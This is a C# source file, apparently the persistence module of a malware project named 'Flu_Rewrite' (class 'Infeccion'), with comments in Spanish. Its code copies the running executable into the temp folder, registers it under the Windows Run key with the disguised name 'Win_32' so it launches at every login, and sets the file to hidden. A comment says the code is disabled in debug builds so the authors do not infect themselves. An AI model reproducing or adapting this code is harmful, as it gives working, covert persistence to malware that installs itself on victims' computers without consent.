using System.IO;
using Microsoft.Win32;
using System.Windows.Forms;
using System;

namespace Flu_Rewrite
{
    //El codigo ha sido #if'ado para que no nos contaminemos a nosotros mismos en las pruebas ;)
    class Infeccion
    {
        //Este codigo solo deberia correr en Windows
        //TODO: RegistroInicio() para Linux y MacOS [Es posible, pero no hay una forma sencilla y unificada de hacerlo] 
        public static void RegistroInicio()
        {
#if !DEBUG
            //Deberia haber un metodo mas facil para renombrar la extension u_u
            String Temp = Path.GetTempFileName();
            Temp = Temp.Replace(".tmp", ".exe");
            FileInfo Self = new FileInfo(Application.ExecutablePath.ToString());
            FileInfo Target = new FileInfo(Temp);
            //Si no hemos sido copiados a un directorio temporal....
            if (Self.DirectoryName != Target.DirectoryName)
            {
                
                File.Copy(Self.FullName, Target.FullName, true);
                Self = new FileInfo(Target.FullName);
            }
            RegistryKey RK = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            RK.SetValue("Win_32", Self.FullName);
            RK.Close();
#endif
        }

        //Esto deberia ser multi-plataforma, pero no tendria mucho sentido si no es en Windows
        public static void EsconderEjecutable()
        {
#if !DEBUG
            FileInfo Self = new FileInfo(Application.ExecutablePath.ToString());
            Self.Attributes = FileAttributes.Hidden;
#endif
        }
    }
}
